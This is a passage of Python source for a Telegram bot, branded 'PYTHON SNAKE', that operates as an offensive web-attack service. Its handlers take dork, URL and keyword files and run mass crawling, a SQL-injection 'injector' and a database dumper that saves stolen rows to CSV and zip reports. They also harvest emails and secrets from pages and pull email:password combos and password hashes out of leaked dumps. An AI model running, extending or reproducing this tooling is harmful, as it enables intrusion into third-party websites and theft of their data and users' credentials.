        await send_file(update, f, "📄 " + os.path.basename(f))
    if len(saved["files"]) > 3:
        await reply_msg(update).reply_text(
            "📁 Remaining %d report(s) are inside the zip."
            % (len(saved["files"]) - 3), parse_mode=ParseMode.HTML)
    if large:
        try:
            lp = os.path.join(DUMP_DIR, "large_targets_%s.txt" % stamp())
            with open(lp, "w", encoding="utf-8") as f:
                for r in large:
                    f.write("%s\n" % (r.get("poc") or r["url"]))
            await send_file(update, lp, "⚠️ large-data URLs — feed these to sqlmap")
        except Exception:
            pass
    if saved["csv"]:
        await send_file(update, saved["csv"], "📊 all rows (csv)")
    if saved["zip"]:
        await send_file(update, saved["zip"], "📦 all reports + rows csv")
    context.user_data["last_sqldump"] = {"urls": len(results), "injectable": okn,
                                         "rows": st["rows"], "tables": st["tables"]}
    await_clear(context)


async def _run_dump(update, context, urls):
    """Page harvest (forms/links/emails/secrets) — purana dumper."""
    uid = str(update.effective_user.id)
    stop_clear(uid)
    tok = stop_mark(uid)
    urls = _uniq([u for u in urls if str(u).startswith("http")])
    msg = await reply_msg(update).reply_text(
        _dump_progress_card({"urls": len(urls), "done": 0, "records": [], "errors": 0,
                             "start": time.time()}, 0),
        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
    spin = {"n": 0}

    async def prog(st):
        spin["n"] += 1
        try:
            await msg.edit_text(
                (H("PAGE HARVEST", "forms • links • secrets") + "\n\n"
                 + bar3((st["done"] / max(1, st["urls"])) * 100, 12, spin["n"]) + "\n\n"
                 + "❖ Pages     : <code>%s/%s</code>\n" % (fmt(st["done"]), fmt(st["urls"]))
                 + "❖ Extracted : <code>%s</code>\n" % fmt(len(st["records"]))),
                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
        except Exception:
            pass

    st = await dump_harvest(urls, progress=prog, uid=uid,
                            timeout=float(sget("dump_timeout", 10) or 10),
                            conc=int(sget("dump_conc", 12) or 12))
    recs = st["records"]
    tot_ep = sum(len(r["endpoints"]) for r in recs)
    tot_se = sum(len(r["secrets"]) for r in recs)
    tot_em = len(_uniq([e for r in recs for e in r["emails"]]))
    card = (H("HARVEST COMPLETE", "%.1fs" % st.get("took", 0)) + "\n\n"
            + bar3(100, 12, None) + "\n\n"
            + "❖ Pages    : <code>%s</code> (errors <code>%s</code>)\n"
            % (fmt(len(recs)), fmt(st["errors"]))
            + "❖ Endpoints: <code>%s</code>\n" % fmt(tot_ep)
            + "❖ Emails   : <code>%s</code>\n" % fmt(tot_em)
            + "❖ Secrets  : <code>%s</code>\n" % fmt(tot_se) + "\n" + B("Top pages"))
    for r in recs[:5]:
        card += "\n<code>%s</code>\n<i>%s</i>" % (
            esc(r["url"][:130]), esc(r["title"] or "no title")[:70])
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(card)[:3]:
        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
                                          reply_markup=kb_back("m:dump"))
    for f in st["files"][:3]:
        await send_file(update, f, "📄 " + os.path.basename(f))
    if st.get("zip"):
        await send_file(update, st["zip"], "📦 all page reports + summary")
    await_clear(context)


async def input_dump_urls(update, context, text: str):
    urls = _urls_from_text(text)
    if not urls:
        await reply_msg(update).reply_text(
            "❌ <b>No URLs found.</b>\nSend full URLs (one per line) or a .txt file:\n"
            "<code>https://target.com/item.php?id=12</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dump"))
        await_set(context, "dump_urls")
        return
    targets = {}
    for v in (context.user_data.get("last_vulns") or []):
        base = v.get("base") or v.get("url")
        if base and v.get("param"):
            targets[base] = v["param"]
    await _run_sqldump(update, context, urls, targets)


async def input_harvest_urls(update, context, text: str):
    urls = _urls_from_text(text)
    if not urls:
        await reply_msg(update).reply_text(
            "❌ <b>No URLs found.</b>\nSend full URLs (one per line) or a .txt file.",
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dump"))
        await_set(context, "harvest_urls")
        return
    await _run_dump(update, context, urls)




# ═══════════════════════════════════════════════════════════════════════════════
#  📂 FILE UPLOAD — dork / URL / keyword .txt bhejo
# ═══════════════════════════════════════════════════════════════════════════════
FILE_MAX = 8 * 1024 * 1024          # 8 MB
FILE_MAX_LINES = 20000
DORK_OP = re.compile(r"(inurl|intitle|intext|allinurl|allintitle|site|filetype|ext|"
                     r"inanchor|allintext)\s*:", re.I)


def classify_lines(lines: list) -> str:
    """dorks / urls / keywords — auto detect."""
    n = max(1, len(lines))
    urls = sum(1 for l in lines if l.lower().startswith(("http://", "https://")))
    dorks = sum(1 for l in lines if DORK_OP.search(l))
    if urls / n > 0.5:
        return "urls"
    if dorks / n > 0.25:
        return "dorks"
    return "keywords"


def _decode_bytes(raw: bytes) -> str:
    """Kisi bhi encoding me file aaye — padh lo."""
    for enc in ("utf-8-sig", "utf-8", "cp1252", "latin-1"):
        try:
            return raw.decode(enc)
        except Exception:
            continue
    return raw.decode("utf-8", "ignore")


_TAG_RE = re.compile(r"<[^>]+>")


def _xlsx_lines(raw: bytes) -> list:
    """XLSX → lines (zipfile + regex, koi library nahi)."""
    import io
    out = []
    with zipfile.ZipFile(io.BytesIO(raw)) as z:
        names = z.namelist()
        shared = []
        if "xl/sharedStrings.xml" in names:
            ss = z.read("xl/sharedStrings.xml").decode("utf-8", "ignore")
            shared = [_html.unescape(_TAG_RE.sub("", m))
                      for m in re.findall(r"<si>(.*?)</si>", ss, re.S)]
        sheets = [n for n in names if re.match(r"xl/worksheets/sheet\d+\.xml$", n)]
        for n in sheets[:4]:
            sheet = z.read(n).decode("utf-8", "ignore")
            for row in re.findall(r"<row[^>]*>(.*?)</row>", sheet, re.S):
                vals = []
                for attrs, body in re.findall(r"<c\b([^>]*)>(.*?)</c>", row, re.S):
                    val = _html.unescape(_TAG_RE.sub("", body)).strip()
                    if 't="s"' in attrs and val.isdigit():
                        idx = int(val)
                        val = shared[idx] if idx < len(shared) else ""
                    if val:
                        vals.append(val)
                if vals:
                    out.append(" ".join(vals))
    return out


def _doc_lines(raw: bytes) -> list:
    """DOCX / PPTX → lines (zip + XML)."""
    import io
    out = []
    with zipfile.ZipFile(io.BytesIO(raw)) as z:
        targets = [n for n in z.namelist()
                   if n in ("word/document.xml",) or re.match(r"ppt/slides/slide\d+\.xml$", n)]
        for n in targets[:20]:
            xml = z.read(n).decode("utf-8", "ignore")
            xml = re.sub(r"</(?:w:p|a:p)>", "\n", xml)
            for line in _TAG_RE.sub("", xml).split("\n"):
                line = _html.unescape(line).strip()
                if line:
                    out.append(line)
    return out


def _json_lines(txt: str) -> list:
    """JSON / NDJSON / API response → values ki list."""
    out = []

    def walk(x, depth=0):
        if depth > 8:
            return
        if isinstance(x, str):
            v = x.strip()
            if v and not v.isdigit():
                out.append(v)
        elif isinstance(x, (list, tuple)):
            for i in x:
                walk(i, depth + 1)
        elif isinstance(x, dict):
            for key in ("url", "link", "href", "keyword", "kw", "dork",
                        "proxy", "ip", "value", "data", "results", "urls"):
                if key in x:
                    walk(x[key], depth + 1)
            for k, v in x.items():
                if k in ("url", "link", "href", "keyword", "kw", "dork",
                         "proxy", "ip", "value", "data", "results", "urls"):
                    continue
                walk(v, depth + 1)
        elif isinstance(x, (int, float)):
            return
    txt = (txt or "").strip()
    try:
        walk(json.loads(txt))
        return out
    except Exception:
        pass
    # NDJSON — ek line me ek JSON
    for line in txt.splitlines():
        line = line.strip().rstrip(",")
        if line.startswith(("{", "[")):
            try:
                walk(json.loads(line if not line.startswith("[") else line))
            except Exception:
                continue
    if out:
        return out
    # last try: "url": "..." patterns
    return [m for m in re.findall(r'"(?:url|link|href|keyword|value)"\s*:\s*"([^"]{3,300})"', txt)]


_BULLET_RE = re.compile(r"^\s*(?:[-*•·>]+|\d{1,4}[.)\]])\s+")
_INLINE_COMMENT = re.compile(r"\s+#.*$")


def _clean_item(line: str) -> str:
    x = _html.unescape((line or "").strip())
    x = x.strip().strip('"\'').strip()
    x = _BULLET_RE.sub("", x)
    x = x.strip().strip('"\'').strip()
    x = _INLINE_COMMENT.sub("", x)
    return " ".join(x.split())


def read_any_file(raw: bytes, name: str = "file.txt") -> tuple:
    """KISI BHI format ki file → (items, meta). Koi library nahi chahiye.

    Support: txt / csv / tsv / list / json / ndjson / log / xml / html /
             xlsx / xlsm / docx / pptx / zip / gz / bina extension
    """
    name = (name or "file.txt").lower()
    meta = {"format": "text", "raw": 0, "junk": 0}
    lines = []

    # 1) gzip
    if raw[:2] == b"\x1f\x8b":
        try:
            import gzip as _gz
            raw = _gz.decompress(raw)
            meta["format"] = "gzip"
        except Exception:
            return [], meta

    # 2) zip family (xlsx / docx / pptx / zip)
    if raw[:2] == b"PK":
        try:
            if name.endswith((".xlsx", ".xlsm", ".xls")):
                lines = _xlsx_lines(raw)
                meta["format"] = "xlsx"
            elif name.endswith((".docx", ".pptx")):
                lines = _doc_lines(raw)
                meta["format"] = "docx" if name.endswith(".docx") else "pptx"
            else:
                lines = _xlsx_lines(raw) or _doc_lines(raw)
                if lines:
                    meta["format"] = "zip→sheet/doc"
                else:
                    import io
                    with zipfile.ZipFile(io.BytesIO(raw)) as z:
                        for n in z.namelist():
                            if n.lower().endswith((".txt", ".csv", ".list", ".json")):
                                lines.extend(_decode_bytes(z.read(n)).splitlines())
                    meta["format"] = "zip"
            if not lines:
                return [], meta
        except Exception:
            return [], meta
    else:
        txt = _decode_bytes(raw)
        head = txt.lstrip()[:1]
        low = name.rsplit(".", 1)[-1] if "." in name else ""
        if head in ("[", "{") or low in ("json", "ndjson"):
            lines = _json_lines(txt)
            if lines:
                meta["format"] = "json" if head in ("[", "{") else "json-lines"
            else:
                lines = txt.splitlines()
        elif low in ("html", "htm") or txt.lstrip()[:6].lower() in ("<html", "<!doct"):
            hrefs = re.findall(r'href=["\']([^"\']{4,300})["\']', txt, re.I)
            body = _html.unescape(_TAG_RE.sub("\n", txt))
            lines = hrefs + [x.strip() for x in body.splitlines() if x.strip()]
            meta["format"] = "html"
        else:
            lines = txt.splitlines()
            meta["format"] = (low or "text")
        # CSV / TSV / semicolon — sirf tab split karo jab dorks na hon
        delim = None
        if low in ("csv",):
            delim = ","
        elif low in ("tsv", "tab"):
            delim = "\t"
        if delim is None and lines:
            sample = [x for x in lines[:400] if x.strip()]
            if sample:
                comma = sum(1 for x in sample if "," in x) / len(sample)
                dork_like = sum(1 for x in sample if DORK_OP.search(x)) / len(sample)
                if comma > 0.6 and dork_like < 0.2:
                    delim = ","
        if delim:
            split = []
            for x in lines:
                split.extend([p for p in x.split(delim)])
            lines = split
            meta["format"] = "csv" if delim == "," else "tsv"

    meta["raw"] = len(lines)
    out, seen = [], set()
    for x in lines:
        c = _clean_item(x)
        if not c or c.startswith(("#", "//", ";", "%")):
            continue
        low = c.lower()
        if low.startswith(("python snake", "py thon snake")):     # apni hi banner line
            continue
        if len(c) > 2000:
            c = c[:2000]
        key = c if len(c) < 400 else c[:400]
        if key in seen:
            meta["junk"] += 1
            continue
        seen.add(key)
        out.append(c)
        if len(out) >= FILE_MAX_LINES:
            break
    return out, meta


def read_lines(raw: bytes) -> list:
    """Purana API — ab read_any_file ka shortcut."""
    return read_any_file(raw)[0]


def kb_file(kind: str) -> InlineKeyboardMarkup:
    if kind == "dorks":
        rows = [[InlineKeyboardButton("🚀 DEEP SCAN", callback_data="f:deep")],
                [InlineKeyboardButton("🎖 GRADE (S+/S/A/B/C)", callback_data="f:grade")],
                [InlineKeyboardButton("📊 ANALYZE", callback_data="f:ana"),
                 InlineKeyboardButton("🎲 RANDOMIZE", callback_data="f:rnd")],
                [InlineKeyboardButton("🧩 MERGE + DEDUP", callback_data="f:merge")],
                [InlineKeyboardButton("💉 INJECTOR", callback_data="f:inj")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]]
    elif kind == "urls":
        rows = [[InlineKeyboardButton("🌊 DEEP CRAWL (fast)", callback_data="f:crawl")],
                [InlineKeyboardButton("🌊🌊 DEEP 2 LEVEL", callback_data="f:crawl2")],
                [InlineKeyboardButton("🔗 URL REVERSE", callback_data="f:rev")],
                [InlineKeyboardButton("💉 INJECTOR", callback_data="f:inj"),
                 InlineKeyboardButton("🧹 CLEAN + DEDUPE", callback_data="f:clean")],
                [InlineKeyboardButton("🧩 MERGE + DEDUP", callback_data="f:merge")],
                [InlineKeyboardButton("🧬 COMBO / HASH ANALYZE", callback_data="f:combo")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]]
    else:
        rows = [[InlineKeyboardButton("📊 QUALITY CHECK", callback_data="f:kqual")],
                [InlineKeyboardButton("🔁 EXPAND (build more)", callback_data="f:kexp")],
                [InlineKeyboardButton("🧩 MERGE + DEDUP", callback_data="f:merge")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]]
    return RK(rows)


# file ko seedha in flows me daal sakte hain (text chahiye, number nahi)
FILE_FLOW_TEXT = {"gen_kw", "dpgen_kw", "kw_input", "qa_keywords", "nc_kw", "px_paste",
                  "rot_paste",
                  "qa_dorks", "qa_urls", "rev_urls", "inj_urls", "dump_urls", "harvest_urls",
                  "parse_dorks",
                  "rand_items", "pro_combo", "pro_domains", "pro_params",
                  "pro_filetypes", "pro_sfilters", "pro_pfilters"}
# count wale steps — file se count nahi nikalte
FILE_FLOW_COUNT = {"gen_count", "dpgen_count", "kw_count", "dork_count",
                   "parse_max", "deep_max"}


async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Koi bhi file (txt/csv/json/xlsx/docx/…) — dorks / URLs / keywords — auto detect."""
    uid = update.effective_user.id
    doc = getattr(update.message, "document", None)
    if not doc:
        return
    if not is_verified(context, uid):
        q, kb = captcha_new(context)
        await update.message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return
    if not access_ok(uid):
        await update.message.reply_text(need_key_text(uid), parse_mode=ParseMode.HTML,
                                        reply_markup=kb_needkey())
        return
    wait = await_get(context)          # koi input prompt khula hai kya?
    name = doc.file_name or "file.txt"
    size = int(doc.file_size or 0)
    if size > FILE_MAX:
        await update.message.reply_text(
            "❌ File too large (%.1f MB). Max 8 MB." % (size / 1024 / 1024))
        return
    msg = await update.message.reply_text("📂 Reading the file…")
    try:
        tg_file = await doc.get_file()
        raw = bytes(await tg_file.download_as_bytearray())
    except Exception as exc:
        try:
            await msg.edit_text("❌ File download fail: <code>%s</code>" % esc(str(exc)[:120]),
                                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return
    lines, fmeta = read_any_file(raw, name)
    if not lines:
        try:
            await msg.edit_text(
                "❌ Nothing usable in that file (empty / binary).\n"
                "<i>Supported: txt, csv, tsv, json, log, html, xlsx, docx, pptx, zip, gz — "
                "ya bina extension bhi.</i>", parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    # ── 1) koi flow khula hai? File ko seedha usme daal do ──
    if wait in FILE_FLOW_TEXT and AWAIT_HANDLERS.get(wait):
        try:
            await msg.edit_text(
                (H("FILE ACCEPTED", "placing into the open flow") + "\n\n"
                 + KV("File", "<code>%s</code>" % esc(name)[:40], "📄")
                 + "\n" + KV("Lines", "<code>%s</code>" % fmt(len(lines)), "📊")
                 + "\n" + KV("Format", "<b>%s</b>" % esc(fmeta.get("format", "text")), "🏷")
                 + "\n" + KV("Duplicate", "<code>%s</code> hataye" % fmt(fmeta.get("junk", 0)), "🧹")),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await_clear(context)
        return await AWAIT_HANDLERS[wait](update, context, "\n".join(lines))
    if wait in FILE_FLOW_COUNT:
        _put_pending(context, wait, lines)          # file yaad rakhi
        try:
            await msg.edit_text(
                (H("FILE SAVED", "%s lines" % fmt(len(lines))) + "\n\n"
                 + KV("File", "<code>%s</code>" % esc(name)[:40], "📄")
                 + "\n" + KV("Format", "<b>%s</b>" % esc(fmeta.get("format", "text")), "🏷")
                 + "\n\n" + B("Now send only the count") + "\n"
                 + P("As soon as you send a number, work starts from this file.") + "\n"
                 + "<i>The file is remembered for 15 minutes.</i>"),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await_set(context, wait)
        return

    await_clear(context)          # file bhejna = naya intent (koi flow khula nahi tha)
    kind = classify_lines(lines)
    context.user_data["file_items"] = lines
    context.user_data["file_kind"] = kind
    context.user_data["file_name"] = name
    if kind == "dorks":
        context.user_data["last_dorks"] = lines
    elif kind == "urls":
        context.user_data["last_urls"] = lines

    label = {"dorks": "🎯 DORKS", "urls": "🔗 URLs", "keywords": "🔑 KEYWORDS"}[kind]
    ops = sum(1 for l in lines if DORK_OP.search(l))
    doms = domains_from_dorks(lines)
    extra = ""
    if doms:
        extra = "\n🌐 site: domains: <code>%d</code> (Common Crawl use hoga)" % len(doms)
    card = (H("FILE LOADED", "%s • %s" % (label, esc(name)[:40])) + "\n\n"
            "📄 Lines   : <code>%s</code>\n"
            "📦 Size    : <code>%.1f KB</code>\n"
            "🏷 Format  : <b>%s</b>\n"
            "🧹 Duplicate: <code>%s</code> hataye\n"
            "⚙️ Operators: <code>%d</code>%s\n\n"
            "<b>Preview:</b>\n%s\n\n"
            "👇 Kya karna hai?"
            % (fmt(len(lines)), size / 1024, esc(fmeta.get("format", "text")),
               fmt(fmeta.get("junk", 0)), ops, extra,
               short_list(lines[:6], 6)))
    try:
        await msg.delete()
    except Exception:
        pass
    await update.message.reply_text(card, parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))


async def cb_deep_crawl(update, context, seeds: list, levels: int = 0):
    """DEEP URL CRAWLER — seed URLs → andar ke saare links (bina proxy)."""
    q = update.callback_query
    seeds = [x for x in (seeds or []) if str(x).startswith("http")][:500] or list(seeds or [])[:500]
    if not seeds:
        try:
            await q.answer("Send URLs first", show_alert=True)
        except Exception:
            pass
        return
    msg = None
    try:
        msg = await q.edit_message_text(
            (H("DEEP URL CRAWL", "chalu…") + "\n\n"
             + KV("Seeds", "<code>%s</code>" % fmt(len(seeds)), "🌱")
             + "\n" + KV("Levels", "<code>%d</code>" % (levels + 1), "🌊")
             + "\n" + KV("Proxy", "<b>not needed</b>", "🧅")),
            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    t0 = time.time()
    last = {"t": 0.0}

    async def prog(st):
        if msg is None or time.time() - last["t"] < 2.5:
            return
        last["t"] = time.time()
        try:
            await msg.edit_text(
                (H("DEEP URL CRAWL", "chalu…") + "\n\n"
                 + KV("Pages", "<code>%d ok • %d fail</code>"
                      % (st["pages_ok"], st["pages_fail"]), "📄")
                 + "\n" + KV("URLs mile", "<code>%s</code>" % fmt(st["found"]), "🔗")
                 + "\n" + KV("Params", "<code>%s</code>" % fmt(st["params"]), "🔢")),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    res = await deep_url_crawl(seeds, levels=levels, progress=prog)
    took = time.time() - t0
    st = res["stats"]
    urls = res["urls"]
    context.user_data["last_urls"] = urls
    if not urls:
        try:
            await msg.edit_text(
                (H("DEEP CRAWL — 0", "%.1fs" % took) + "\n\n"
                 + "❌ Nothing found. Pages failed: <code>%s</code>\n\n"
                 % fmt(st["pages_fail"])
                 + P("The sites are probably blocking us, or they load with JS.")),
                parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
        except Exception:
            pass
        return
    card = (H("DEEP URL CRAWL — DONE", "%.1fs" % took) + "\n\n"
            + KV("Pages", "<code>%d ok • %d fail</code>"
                 % (st["pages_ok"], st["pages_fail"]), "📄")
            + "\n" + KV("URLs", "<code>%s</code> unique" % fmt(len(urls)), "🔗")
            + "\n" + KV("Domains", "<code>%s</code>" % fmt(st["domains"]), "🌐")
            + "\n" + KV("Params", "<code>%s</code>" % fmt(st["params"]), "🔢")
            + "\n" + KV("Speed", "<code>%.0f URLs/sec</code>"
                 % (len(urls) / max(0.2, took)), "⚡")
            + "\n\n<b>Top 8:</b>\n" + short_list(urls[:8], 8))
    try:
        if msg:
            await msg.edit_text(card, parse_mode=ParseMode.HTML,
                                reply_markup=RK([
                                    [InlineKeyboardButton("🔗 URL REVERSE", callback_data="f:rev")],
                                    [InlineKeyboardButton("💉 INJECTOR", callback_data="f:inj")],
                                    [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
                                ]))
    except Exception:
        pass
    path, cnt = dump_text(urls, "crawl", "PYTHON SNAKE — deep url crawl")
    await send_file(update, path, "🌊 %d URLs • %d pages" % (cnt, st["pages_ok"]))
    if res["params"]:
        ppath, pcnt = dump_text(res["params"], "crawl_params",
                                "PYTHON SNAKE — params (deep crawl)")
        await send_file(update, ppath, "🔢 %d parameters" % pcnt)
    await_clear(context)


async def cb_file(update, context, action: str):
    q = update.callback_query
    items = context.user_data.get("file_items") or []
    kind = context.user_data.get("file_kind") or "dorks"
    if not items:
        try:
            await q.answer("Send a file first", show_alert=True)
        except Exception:
            pass
        return

    if action in ("crawl", "crawl2"):
        return await cb_deep_crawl(update, context, items,
                                   levels=1 if action == "crawl2" else 0)

    if action == "deep":
        context.user_data["parse_dorks"] = items[:1000]
        doms = domains_from_dorks(items)
        try:
            await q.edit_message_text(
                H("DEEP SCAN", "%d dorks" % len(items)) + "\n\n"
                "Max URLs kitne chahiye? <b>Number bhejo</b>\n"
                "<i>Recommended: 5000</i>%s"
                % (("\n\n🌐 <b>%d domain</b> — Common Crawl se bhi aayenge" % len(doms)) if doms else ""),
                parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
        except Exception:
            pass
        await_set(context, "deep_max")
        return

    if action == "grade":
        rows = []
        for it in items:
            r = dork_score_full(it)
            rows.append((r["total"], r["grade"], it))
        avg = sum(r[0] for r in rows) / max(1, len(rows))
        tiers = {}
        for sc, g, it in rows:
            key = "S" if g in ("S+", "S") else g
            tiers.setdefault(key, []).append(it)
        kb = RK([[InlineKeyboardButton("🚀 INJECT TOP GRADE", callback_data="f:inj")],
                 [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]])
        txt = (H("DORK GRADER", "avg %.0f • %s" % (avg, dork_grade(avg))) + "\n\n"
               + KV("Total", "<code>%s</code>" % fmt(len(items)), "📦") + "\n"
               + "\n".join(KV("Grade %s" % g, "<code>%s</code>" % fmt(len(tiers.get(g, []))),
                               GRADE_EMOJI.get(g, "•"))
                           for g in ("S", "A", "B", "C", "D", "F")) + "\n\n"
               + B("Top 5") + "\n"
               + "\n".join("%s <code>%d</code> %s"
                           % (GRADE_EMOJI.get(g, "•"), sc, esc(it[:70]))
                           for sc, g, it in sorted(rows, key=lambda z: -z[0])[:5]))
        try:
            await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass
        for g in ("S", "A", "B", "C"):
            lst = tiers.get(g) or []
            if len(lst) < 2:
                continue
            tp, tn = dump_text(lst, "grade_" + g, "PYTHON SNAKE — grade %s" % g)
            await send_file(update, tp, "%s Grade %s — %s dorks" % (GRADE_EMOJI[g], g, fmt(tn)))
        low = tiers.get("D", []) + tiers.get("F", [])
        if low:
            lp, ln = dump_text(low, "grade_low", "PYTHON SNAKE — grade D/F (drop these)")
            await send_file(update, lp, "🔴 Grade D/F — %s dorks (hata do)" % fmt(ln))
        return

    if action == "combo":
        a = analyze_dump(items)
        hashes = " • ".join("%s:%s" % (k, fmt(v)) for k, v in
                            sorted(a["hash"].items(), key=lambda z: -z[1])) or "—"
        st = a["strength"]
        txt = (H("COMBO / HASH ANALYZE", "%s lines" % fmt(a["lines"])) + "\n\n"
               + KV("Unique", "<code>%s</code>" % fmt(a["unique"]), "📦") + "\n"
               + KV("email:pass", "<code>%s</code>" % fmt(a["combo"]), "🧬") + "\n"
               + KV("Emails only", "<code>%s</code>" % fmt(a["emails"]), "📧") + "\n"
               + KV("Hash mile", "<code>%s</code>" % hashes, "🔑") + "\n"
               + KV("Domains", "<code>%s</code>" % fmt(a["domain_count"]), "🌐") + "\n\n"
               + B("Password strength") + "\n"
               + "🔴 weak <code>%s</code> • 🟡 medium <code>%s</code> • "
                 "🟢 strong <code>%s</code> • 💎 very strong <code>%s</code>"
               % (fmt(st["weak"]), fmt(st["medium"]), fmt(st["strong"]),
                  fmt(st["very_strong"])) + "\n\n"
               + (B("Top domains") + "\n"
                  + "\n".join("• <code>%s</code> — %s" % (esc(d), fmt(c))
                               for d, c in a["top_domains"]) if a["top_domains"] else "")
               + "\n\n<i>Hash sirf pehchan (identify) hote hain — bot cracking nahi karta.</i>")
        try:
            await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                      reply_markup=kb_back("m:dump"))
        except Exception:
            pass
        if a["combo_list"]:
            cp, cn = dump_text(a["combo_list"], "combos_extracted", "PYTHON SNAKE — email:pass")
            await send_file(update, cp, "🧬 %s email:pass" % fmt(cn))
        if a["hash_list"]:
            hp, hn = dump_text(a["hash_list"], "hashes_found", "PYTHON SNAKE — hashes")
            await send_file(update, hp, "🔑 %s hash lines" % fmt(hn))
        if a["email_list"]:
            ep, en = dump_text(a["email_list"], "emails_only", "PYTHON SNAKE — emails")
            await send_file(update, ep, "📧 %s emails" % fmt(en))
        return

    if action == "merge":
        bucket = list(context.user_data.get("merge_bucket") or [])
        before = len(bucket)
        bucket.extend(items)
        m = merge_dedup(bucket)
        context.user_data["merge_bucket"] = m["list"]
        txt = (H("MERGE + DEDUP", "bucket %s" % fmt(m["unique"])) + "\n\n"
               + KV("Bucket before", "<code>%s</code>" % fmt(before), "📦") + "\n"
               + KV("From this file", "<code>%s</code>" % fmt(len(items)), "📄") + "\n"
               + KV("Merged", "<code>%s</code>" % fmt(m["unique"]), "🧩") + "\n"
               + KV("Duplicates removed", "<code>%s</code>" % fmt(m["dupes"]), "🧹") + "\n"
               + KV("Type", " • ".join("%s:%s" % (k, fmt(v)) for k, v in m["kinds"].items()
                                       if v), "🏷") + "\n\n"
               + P("Send more files, then press 🧩 MERGE — everything keeps collecting."))
        kb = RK([[InlineKeyboardButton("✅ MERGE NOW (send file)", callback_data="f:merge_now")],
                 [InlineKeyboardButton("🗑 BUCKET CLEAR", callback_data="f:merge_clear")],
                 [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]])
        try:
            await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass
        return

    if action == "merge_now":
        bucket = context.user_data.get("merge_bucket") or []
        if not bucket:
            try:
                await q.answer("Bucket is empty — send a file first, then MERGE", show_alert=True)
            except Exception:
                pass
            return
        m = merge_dedup(bucket)
        path, cnt = dump_text(m["list"], "merged", "PYTHON SNAKE — merged + deduped")
        try:
            await q.edit_message_text(
                (H("MERGE DONE", "%s unique" % fmt(cnt)) + "\n\n"
                 + KV("Input lines", "<code>%s</code>" % fmt(m["input"]), "📥") + "\n"
                 + KV("Duplicate", "<code>%s</code>" % fmt(m["dupes"]), "🧹") + "\n"
                 + KV("Unique", "<code>%s</code>" % fmt(m["unique"]), "✅") + "\n\n"
                 + P("The file is being sent below.")),
                parse_mode=ParseMode.HTML, reply_markup=kb_back("m:home"))
        except Exception:
            pass
        await send_file(update, path, "🧩 %s merged lines" % fmt(cnt))
        context.user_data["file_items"] = m["list"]
        return

    if action == "merge_clear":
        context.user_data.pop("merge_bucket", None)
        try:
            await q.edit_message_text("🗑 Merge bucket clear.",
                                      reply_markup=kb_back("m:home"), parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return

    if action == "ana":
        scores = [(score_dork(x)[0] if DORK_OP.search(x) else score_keyword(x)[0]) for x in items]
        avg = sum(scores) / len(scores) if scores else 0
        buckets = {"🔥 80+": 0, "✅ 65-79": 0, "🟡 45-64": 0, "🟠 25-44": 0, "🔴 <25": 0}
        for sc in scores:
            if sc >= 80: buckets["🔥 80+"] += 1
            elif sc >= 65: buckets["✅ 65-79"] += 1
            elif sc >= 45: buckets["🟡 45-64"] += 1
            elif sc >= 25: buckets["🟠 25-44"] += 1
            else: buckets["🔴 <25"] += 1
        best = sorted(zip(scores, items), key=lambda z: -z[0])[:8]
        txt = (H("FILE ANALYZE", "%d items" % len(items)) + "\n\n"
               + ("⭐ Average: <code>%.0f/100</code>\n\n" % avg)
               + "\n".join("%s : <code>%s</code>" % (kk, fmt(vv)) for kk, vv in buckets.items())
               + "\n\n<b>Top 8:</b>\n" + short_list([b for _, b in best], 8))
        try:
            await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        path, cnt = dump_text(["%3d  %s" % (sco, it) for sco, it in zip(scores, items)],
                              "file_analyze", "PYTHON SNAKE — file analyze")
        await send_file(update, path, "📊 %d scored" % cnt)
        return

    if action == "rnd":
        out = randomize_dorks(items, n=min(len(items) * 2, 2000))
        context.user_data["last_dorks"] = out
        path, cnt = dump_text(out, "random", "PYTHON SNAKE — randomized")
        try:
            await q.edit_message_text(
                H("RANDOMIZED", "%d → %d" % (len(items), len(out))) + "\n\n"
                + short_list(out[:10], 10), parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        await send_file(update, path, "🎲 %d randomized" % cnt)
        return

    if action == "rev":
        infos = [url_reverse(u) for u in items[:20]]
        infos = [i for i in infos if i]
        dorks = []
        for i in infos:
            dorks += url_reverse_dorks(i, n=12)
        dorks = _uniq(dorks)
        context.user_data["last_dorks"] = dorks
        path, cnt = dump_text(dorks, "url_reverse", "PYTHON SNAKE — reverse dorks")
        try:
            await q.edit_message_text(
                H("URL REVERSE", "%d URLs → %d dorks" % (len(infos), cnt)) + "\n\n"
                + short_list(dorks[:10], 10), parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        await send_file(update, path, "🔗 %d dorks" % cnt)
        return

    if action == "clean":
        seen, clean = set(), []
        for u in items:
            cu = _clean_url(u)
            if not cu:
                continue
            k = cu.split("#")[0].rstrip("/")
            if k in seen:
                continue
            seen.add(k)
            clean.append(cu)
